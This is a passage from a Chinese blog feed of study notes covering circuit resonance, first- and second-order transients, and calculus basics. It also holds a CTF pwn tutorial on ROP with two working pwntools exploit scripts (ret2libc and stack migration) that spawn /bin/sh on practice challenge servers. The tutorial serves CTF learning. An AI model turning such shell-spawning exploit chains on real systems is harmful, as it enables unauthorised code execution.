title="谐振时电压电流"></a>谐振时电压电流</h3><p>$$<br>Z(jw)&#x3D;R<br>$$</p><p>阻抗呈纯电阻，达最小值</p><p>电流达最大值，且与电压源电压同相<br>$$<br>Q&#x3D;\frac{w_0L}{R}&#x3D;\frac{1}{w_0RC}&#x3D;\frac{\rho}{R}<br>$$<br>Q为串联谐振电路的<strong>品质因素</strong></p><p>各处电压：<br>$$<br>\dot{U}_R&#x3D;\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_L&#x3D;jQ\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_C&#x3D;-jQ\dot{U}_S<br>$$</p><h3 id="谐振时功率能量"><a href="#谐振时功率能量" class="headerlink" title="谐振时功率能量"></a>谐振时功率能量</h3><p>由于$u(t)&#x3D;u_L(t)+u_C(t)&#x3D;0$（相当于虚短路），任何时刻进入电感电容总瞬时功率为0，电压源发出的功率<strong>全部</strong>被电阻吸收</p><h3 id="谐振电路的频率特性"><a href="#谐振电路的频率特性" class="headerlink" title="谐振电路的频率特性"></a>谐振电路的频率特性</h3><p>串联谐振电路</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522170355601.png" alt="image-20230522170355601"><br>$$<br>|H(jw)|&#x3D;\frac{1}{\sqrt{1+Q^2(\frac{w}{w_0}-\frac{w_0}{w})^2}}<br>$$<br>当$w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}$电路发生谐振，达最大值，电路有<strong>带通滤波特性</strong></p><p>$|H(jw)|&#x3D;\frac{1}{\sqrt{2}}$，即-3dB时，带宽：$\Delta w&#x3D;\frac{w_0}{Q}&#x3D;2\alpha&#x3D;\frac{1}{\tau}$</p><p>故带宽$\Delta w$与品质因素$Q$成反比，通带越窄，曲线越尖锐，对信号选择性越好</p><p><strong>通用谐振曲线</strong>（横纵坐标都是相对量）</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522171539550.png" alt="image-20230522171539550"></p><p>当$w&#x3D;w_+\space or\space w_-$时，$|H(jw)|&#x3D;0.707(-3dB),\theta &#x3D;\pm 45^。$</p><h2 id="RLC并联谐振电路"><a href="#RLC并联谐振电路" class="headerlink" title="RLC并联谐振电路"></a>RLC并联谐振电路</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522172056625.png" alt="image-20230522172056625"></p><p>懒得写了，怎么回事呢:shit:</p><p>累了😑️，学个模电先</p>]]></content>
      
      
      <categories>
          
          <category> ESE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电路分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态电路及瞬态分析</title>
      <link href="/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/"/>
      <url>/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>$V_D$表大DC，$v_D$表全信号，$v_d$表小AC</p><p>热电压常数$V_T&#x3D;\frac{k}{q}T$在常温(27度)默认为26mV</p><p>$V_S$域值电压$V_{TH}$为BJT重要参数</p></blockquote><h1 id="电容-电感"><a href="#电容-电感" class="headerlink" title="电容&amp;电感"></a>电容&amp;电感</h1><h2 id="电容"><a href="#电容" class="headerlink" title="电容"></a>电容</h2><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p>$$<br>q&#x3D;CU<br>$$</p><p>$$<br>i(t)&#x3D;\frac{dq}{dt}&#x3D;C\frac{du}{dt}<br>$$</p><p>$$<br>u_c(t)&#x3D;\frac{1}{C}\int_{-\infty}^0i(\xi)d\xi+\frac{1}{C}\int^t_0i(\xi)d\xi<br>$$</p><h3 id="电压的记忆性"><a href="#电压的记忆性" class="headerlink" title="电压的记忆性"></a>电压的记忆性</h3><p>峰值检测器电路</p><h3 id="电压的连续性"><a href="#电压的连续性" class="headerlink" title="电压的连续性"></a>电压的连续性</h3><p>电容电流<strong>有界</strong>时，电压不能突变</p><h3 id="储能"><a href="#储能" class="headerlink" title="储能"></a>储能</h3><p>$$<br>p(t)&#x3D;u(t)C\frac{du}{dt}<br>$$</p><p>$$<br>W(t_0,t)&#x3D;\int_{t_0}^tp(\xi)d\xi&#x3D;\frac{1}{2}C[u^2(t)-u^2(t_0)]<br>$$</p><p>若初始储能为0，则任意时刻能量：<br>$$<br>W(t)&#x3D;\frac{1}{2}Cu^2(t)<br>$$<br>某时刻电容储能只取决于<strong>电压</strong>，与电流无关</p><h3 id="串并联"><a href="#串并联" class="headerlink" title="串并联"></a>串并联</h3><p>并联变大，串联变小</p><h2 id="电感"><a href="#电感" class="headerlink" title="电感"></a>电感</h2><h3 id="模型-1"><a href="#模型-1" class="headerlink" title="模型"></a>模型</h3><p>$$<br>\psi &#x3D;Li<br>$$</p><p>$$<br>u(t)&#x3D;\frac{d\psi}{dt}&#x3D;L\frac{di}{dt}<br>$$</p><p>$$<br>i(t)&#x3D;\frac{1}{L}\int_{-\infty}^0u(\xi)d\xi+\frac{1}{L}\int_0^tu(\xi)d\xi<br>$$</p><h3 id="电流的记忆性"><a href="#电流的记忆性" class="headerlink" title="电流的记忆性"></a>电流的记忆性</h3><h3 id="电流的连续性"><a href="#电流的连续性" class="headerlink" title="电流的连续性"></a>电流的连续性</h3><h3 id="储能-1"><a href="#储能-1" class="headerlink" title="储能"></a>储能</h3><p>$$<br>p(t)&#x3D;i(t)L\frac{di}{dt}<br>$$</p><p>$$<br>w(t_0,t)&#x3D;\frac{1}{2}L[i^2(t)-i^2(t_0)]<br>$$</p><p>某时刻电容储能只取决于<strong>电流</strong>，与电感无关</p><h3 id="串并联-1"><a href="#串并联-1" class="headerlink" title="串并联"></a>串并联</h3><p>并联变小，串联变大</p><h1 id="一阶电路的暂态过程"><a href="#一阶电路的暂态过程" class="headerlink" title="一阶电路的暂态过程"></a>一阶电路的暂态过程</h1><h2 id="全响应-三要素法（仅限直流激励一阶）"><a href="#全响应-三要素法（仅限直流激励一阶）" class="headerlink" title="全响应-三要素法（仅限直流激励一阶）"></a>全响应-三要素法（仅限直流激励一阶）</h2><p>$$<br>f(t)&#x3D;[f(0_+)-f(\infty)]e^{-\frac{t}{\tau}}+f(\infty)\space (t\geq0)<br>$$</p><blockquote><p>全响应 &#x3D; 固有响应（瞬态响应） + 强制响应（稳态响应）</p><p>注意：<strong>非直流激励</strong>下，固有响应<strong>不等于</strong>瞬态响应，稳态响应<strong>不等于</strong>稳态响应</p><p>瞬态响应：随t变化固有响应：由内部电路原本状态引起的变化</p></blockquote><p>$$<br>f(t)&#x3D;f(0_+)e^{-\frac{t}{\tau}}+f(\infty)(1-e^{-\frac{t}{\tau}})\space(t\geq 0)<br>$$</p><blockquote><p>全响应 &#x3D; 零输入响应 + 零状态响应</p></blockquote><p>$$<br>\tau&#x3D;R_0C\space or\space\tau&#x3D;\frac{L}{R_0}<br>$$</p><p>$\tau$ 具有时间但量纲，称为RC电路的<strong>时间常数</strong></p><p>一般用$3\tau$ 法判断放电过程结束，即90%</p><p>计算R时，电容用<strong>戴维宁等效</strong>，电感用<strong>诺顿等效</strong></p><h3 id="warning-注意"><a href="#warning-注意" class="headerlink" title=":warning:注意"></a>:warning:注意</h3><p>电容电路里，电流<strong>可以跃变</strong>；电感电路里，电压<strong>可以跃变</strong></p><p>注意表达式范围是否包含0</p><h2 id="包含开关序列的直流一阶电路"><a href="#包含开关序列的直流一阶电路" class="headerlink" title="包含开关序列的直流一阶电路"></a>包含开关序列的直流一阶电路</h2><h3 id="阶跃函数"><a href="#阶跃函数" class="headerlink" title="阶跃函数"></a>阶跃函数</h3><p>$$<br>\varepsilon(t)&#x3D;\begin{cases}<br>0 &amp; t&lt;0\\<br>1 &amp; t&gt;0<br>\end{cases}<br>$$</p><p>引入阶跃电流源和阶跃电压源可以省去电路中的开关，可以应用叠加定理计算电路的零状态响应</p><h3 id="阶跃响应"><a href="#阶跃响应" class="headerlink" title="阶跃响应"></a>阶跃响应</h3><p>单位阶跃信号作用下电路的<strong>零状态响应</strong>，用$s(t)$表示</p><p>已知电路的阶跃响应，利用<strong>叠加定理</strong>易得任意分段恒定信号激励下线性时不变电路的零状态响应</p><h3 id="冲激函数"><a href="#冲激函数" class="headerlink" title="冲激函数"></a>冲激函数</h3><p>一个无界信号$\delta(t)$为<strong>单位冲激函数</strong>当且仅当<br>$$<br>\begin{cases}<br>\delta(t)&#x3D;\begin{cases}<br>        奇异值&amp;t&#x3D;0\\<br>        0&amp;t\neq 0<br>    \end{cases}\\<br>    \int_{-\varepsilon_2}^{\varepsilon_1}\delta(t)dt&#x3D;1&amp;\varepsilon_1&gt;0,\varepsilon_2&gt;0<br>\end{cases}<br>$$<br>单位阶跃函数与单位冲激函数间存在关系<br>$$<br>\delta(t)&#x3D;\frac{d\varepsilon(t)}{dt}<br>$$</p><p>$$<br>\varepsilon(t)&#x3D;\int^t_{-\infty}\delta(\xi)d\xi<br>$$</p><h3 id="冲激响应"><a href="#冲激响应" class="headerlink" title="冲激响应"></a>冲激响应</h3><p>单位冲激信号作用下电路的<strong>零状态响应</strong>，表示为$h(t)$</p><p>可先求出$s(t)$，对时间求导</p><h1 id="二阶电路的暂态过程"><a href="#二阶电路的暂态过程" class="headerlink" title="二阶电路的暂态过程"></a>二阶电路的暂态过程</h1><blockquote><p>仅讨论含两个动态原件的线性二阶电路</p></blockquote><h2 id="RLC串联电路的零输入响应"><a href="#RLC串联电路的零输入响应" class="headerlink" title="RLC串联电路的零输入响应"></a>RLC串联电路的零输入响应</h2><p>常系数非齐次线性二阶微分方程:<br>$$<br>LC\frac{d^2u_c}{dt^2}+RC\frac{du_c}{dt}+u_c&#x3D;u_s(t)<br>$$<br>电路微分方程的特征根（电路的<strong>固有频率</strong>）:<br>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><ol><li>$R&gt;2\sqrt{\frac{L}{C}}$ ，$s_{1,2}$为不相等实根，<strong>过阻尼情况</strong></li><li>$R&#x3D;2\sqrt{\frac{L}{C}}$ ，$s_{1,2}$为相等实根，<strong>临界阻尼情况</strong></li><li>$R&lt;2\sqrt{\frac{L}{C}}$ ，$s_{1,2}$共轭复数根，<strong>欠阻尼情况</strong></li></ol><blockquote><p>对R来说，越大越不易震荡，R趋近$\infty$时开路；越小越易震荡，R为0时为LC震荡电路</p><p>L越大（L储能越大，$\frac{1}{2}L\Delta i^2$大，电流变化大）C越小（$q&#x3D;CU$电压变化越大），越容易震荡</p></blockquote><h3 id="过阻尼"><a href="#过阻尼" class="headerlink" title="过阻尼"></a>过阻尼</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192230226.png" alt="image-20230521192230226"></p><h3 id="临界阻尼"><a href="#临界阻尼" class="headerlink" title="临界阻尼"></a>临界阻尼</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192259513.png" alt="image-20230521192259513"></p><h3 id="欠阻尼"><a href="#欠阻尼" class="headerlink" title="欠阻尼"></a>欠阻尼</h3><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>衰减因子$\alpha&#x3D;\frac{R}{2L}$，因为RCL串联电路震荡快慢由i决定，故用电感时间常数，等于$\frac{1}{2\tau}$</p><p>无阻尼自然（谐振）频率$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>有阻尼自然频率$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192307785.png" alt="image-20230521192307785"></p><p>欠阻尼能量在<strong>电容与电感</strong>之间交换</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192313567.png" alt="image-20230521192313567"></p><h3 id="直流激励下RLC串联电路的响应"><a href="#直流激励下RLC串联电路的响应" class="headerlink" title="直流激励下RLC串联电路的响应"></a>直流激励下RLC串联电路的响应</h3><p>全响应由对应齐次微分方程通解与微分方程特解之和组成<br>$$<br>u_c(t)&#x3D;u_{Ch}(t)+u_{Cp}(t)<br>$$<br> $s_1\neq s_2$时<br>$$<br>u_c(t)&#x3D;K_1e^{s_1t}+K_2e^{s_2t}+U_S<br>$$<br>利用<br>$$<br>u_c(0),\frac{du_c(t)}{dt}\Bigg |_{t&#x3D;0}&#x3D;\frac{i_L(0)}{C}<br>$$<br>求解$K_1K_2$</p><h2 id="RLC并联电路的零输入响应"><a href="#RLC并联电路的零输入响应" class="headerlink" title="RLC并联电路的零输入响应"></a>RLC并联电路的零输入响应</h2><p>$$<br>LC\frac{d^2i_L}{dt^2}+GL\frac{di_L}{dt}+i_L&#x3D;i_s(t)<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{G}{2C}\pm\sqrt{(\frac{G}{2C})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>衰减因子$\alpha&#x3D;\frac{G}{2C}$，因为RCL并联电路震荡快慢由u决定，故用电容时间常数，等于$\frac{1}{2\tau}$</p><p>无阻尼自然（谐振）频率$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>有阻尼自然频率$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p>]]></content>
      
      
      <categories>
          
          <category> ESE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电路分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（二）——ROP</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94ROP/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h1><p>Linux下的ASLR总共有3个级别，0、1、2</p><ul><li>0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。</li><li>1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化</li></ul><p>2是增强的ASLR，增加了堆随机化</p><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>rdi，rsi， rdx， rcx， r8， r9</p><p>参数为7个以上，后面以此从右往左放入栈中</p><h2 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">read()：</span><br><span class="line">  <span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> nbytes)</span>; </span><br><span class="line">  <span class="comment">//fd 为要读取的文件的描述符  0</span></span><br><span class="line">  <span class="comment">//buf 为要读取的数据的缓冲区地址 </span></span><br><span class="line">  <span class="comment">//nbytes 为要读取的数据的字节数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，</span></span><br><span class="line"> <span class="comment">//成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。</span></span><br><span class="line"></span><br><span class="line">write() </span><br><span class="line">  <span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> nbytes)</span>;</span><br><span class="line">  <span class="comment">//fd 为要写入的文件的描述符  1 </span></span><br><span class="line">  <span class="comment">//buf 为要写入的数据的缓冲区地址</span></span><br><span class="line">  <span class="comment">//nbytes 为要写入的数据的字节数 </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd，</span></span><br><span class="line"> <span class="comment">//成功则返回写入的字节数，失败则返回 -1。</span></span><br><span class="line"><span class="built_in">printf</span>一直输出到\x00</span><br></pre></td></tr></table></figure><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><ul><li>read&#x2F;rewrite register&#x2F;memory<ul><li><code>pop eaxret</code></li><li><code>mov [eax],ebxret</code></li></ul></li><li>system call</li><li>change esp</li></ul><h3 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h3><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h4 id="X86"><a href="#X86" class="headerlink" title="X86"></a>X86</h4><p><strong>调用方式：</strong><code>int 0x80</code> 中断进行系统调用</p><p><strong>传参方式：</strong>首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p><p><strong>调用号：</strong><code>sys_read</code> 的调用号 为 3，<code>sys_write</code> 的调用号 为 4，<code>sys_execve</code>的调用号为11*(0xB)*</p><h4 id="amd"><a href="#amd" class="headerlink" title="amd"></a>amd</h4><p><strong>调用方式：</strong><code>syscall</code>进行系统调用</p><p><strong>传参方式：</strong>首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p><p><strong>调用号：</strong><code>sys_read</code> 的调用号 为 0， <code>sys_write</code> 的调用号 为 1，<code>stub_execve</code> 的调用号 为 59*(0x3B)*，<code>stub_rt_sigreturn</code>的调用号 为 15</p><p><code>execve</code>函数作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p><p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>可分两次写入<code>/bin</code>和<code>/sh\x00</code></p><p>​</p><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn4&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28240</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">rdi_ret=<span class="number">0x00000000004007d3</span></span><br><span class="line">ret=<span class="number">0x0000000000400556</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x68</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(rdi_ret)     </span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x68</span>*<span class="string">b&#x27;\x00&#x27;</span> + p64(rdi_ret)+p64(binsh)+p64(ret)+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="got-hijacking"><a href="#got-hijacking" class="headerlink" title="got hijacking"></a>got hijacking</h1><p>把got表地址覆盖为目标函数的地址</p><h1 id="stack-migration"><a href="#stack-migration" class="headerlink" title="stack migration"></a>stack migration</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>call func:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push eip+4</span><br><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br></pre></td></tr></table></figure><p><strong>leave:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><p><strong>ret:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure><h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">28566</span></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span></span><br><span class="line">p = remote(host,  port)</span><br><span class="line">elf =ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">hack_addr = <span class="number">0x0804854B</span></span><br><span class="line">leave_ret_addr = <span class="number">0x080484b8</span></span><br><span class="line">echoflag_addr = <span class="number">0x080486c0</span></span><br><span class="line">vul_addr = <span class="number">0x08048595</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">pl = cyclic(<span class="number">39</span>)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">ebp = u32(p.recvn(<span class="number">4</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">pl = flat([<span class="string">b&quot;aaaa&quot;</span>,sys_addr, <span class="string">b&quot;bbbb&quot;</span>,ebp-<span class="number">0x28</span>+<span class="number">16</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line">pl += cyclic(<span class="number">16</span>)</span><br><span class="line">pl += flat([ebp-<span class="number">0x28</span>, leave_ret_addr])</span><br><span class="line">p.send(pl)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这里解释一下，为什么会有4个字节空余的部分。<br>这里的部分，在正常调用system函数的时候，堆栈位置的system_plt之后的内容为system函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在system_plt和sh_addr之间增加了4个字符来进行填充。</p></blockquote><h2 id="其他gadgets"><a href="#其他gadgets" class="headerlink" title="其他gadgets"></a>其他gadgets</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp,0xNN;ret</span><br><span class="line">sub esp,0xNN;ret</span><br><span class="line">ret 0xNN</span><br><span class="line">xchg esp,exx;ret</span><br><span class="line">partial overwrite ebp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MK_Caculus</title>
      <link href="/MK-Caculus/"/>
      <url>/MK-Caculus/</url>
      
        <content type="html"><![CDATA[<h1 id="函数基础"><a href="#函数基础" class="headerlink" title="函数基础"></a>函数基础</h1><h2 id="双曲函数"><a href="#双曲函数" class="headerlink" title="双曲函数"></a>双曲函数</h2><p>$$ 双曲正弦函数\space y&#x3D;sh \space x &#x3D;\frac{e^x-e^{-x}}{2} $$</p><p>$$ 双曲余弦函数\space y&#x3D;ch \space x &#x3D;\frac{e^x+e^{-x}}{2} $$</p><p>$$ 双曲正切函数\space y&#x3D;th \space x&#x3D;\frac{sh\space x}{ch\space x} &#x3D;\frac{e^x-e^{-x}}{e^x+e^{-x}} $$</p><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><p>$$ secA&#x3D;\frac{1}{cosA} $$</p><p>$$ cscA&#x3D;\frac{1}{sinA} $$</p><hr><h1 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h1><h2 id="数列极限"><a href="#数列极限" class="headerlink" title="数列极限"></a>数列极限</h2><p>$$ \forall \varepsilon&gt;0,\exists N&gt;0,s.t.|x_n-A|&lt;\varepsilon,when\space n&gt;N $$</p><h2 id="自变量趋于无穷大时函数极限"><a href="#自变量趋于无穷大时函数极限" class="headerlink" title="自变量趋于无穷大时函数极限"></a>自变量趋于无穷大时函数极限</h2><p>$$ \forall \varepsilon &gt;0,\exist X&gt;0,s.t.|f(x)-A|&lt;\varepsilon,when \  \ x&gt;X&#x2F;x&lt;X&#x2F;|x|&gt;X $$</p><h2 id="自变量趋近有限值时函数极限"><a href="#自变量趋近有限值时函数极限" class="headerlink" title="自变量趋近有限值时函数极限"></a>自变量趋近有限值时函数极限</h2><p>$$ \forall \varepsilon&gt;0,\exist \delta&gt;0,s.t.|f(x)-A|&lt;\varepsilon,when \ \ 0&lt;|x-x_0|&lt;\delta $$</p><h2 id="单侧极限：dddd"><a href="#单侧极限：dddd" class="headerlink" title="单侧极限：dddd"></a>单侧极限：dddd</h2><h2 id="数列极限与函数极限的关系"><a 